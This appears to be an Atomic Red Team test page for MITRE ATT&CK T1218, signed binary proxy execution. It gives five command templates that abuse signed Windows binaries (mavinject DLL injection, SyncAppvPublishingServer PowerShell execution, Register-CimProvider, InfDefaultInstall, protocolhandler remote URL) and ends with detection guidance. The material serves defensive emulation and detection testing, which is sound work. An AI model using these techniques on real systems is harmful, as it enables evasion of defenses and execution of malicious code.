# T1218 - Signed Binary Proxy Execution
Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - mavinject - Inject DLL into running process
Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}
```

Invoke-AtomicTest T1218 -TestNumbers 1

### Atomic Test #2 - SyncAppvPublishingServer - Execute arbitrary PowerShell code
Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe. Requires Windows 10.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
SyncAppvPublishingServer.exe "n; #{powershell_code}"
```

Invoke-AtomicTest T1218 -TestNumbers 2

### Atomic Test #3 - Register-CimProvider - Execute evil dll
Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload}
```

Invoke-AtomicTest T1218 -TestNumbers 3

### Atomic Test #4 - InfDefaultInstall.exe .inf Execution
Test execution of a .inf using InfDefaultInstall.exe

Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
InfDefaultInstall.exe #{inf_to_execute}
```

Invoke-AtomicTest T1218 -TestNumbers 4

### Atomic Test #5 - ProtocolHandler.exe Downloaded a Suspicious File
Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
#{microsoft_wordpath}\protocolhandler.exe "ms-word:nft|u|#{remote_url}"
```

Invoke-AtomicTest T1218 -TestNumbers 5

## Detection
Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.

Monitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.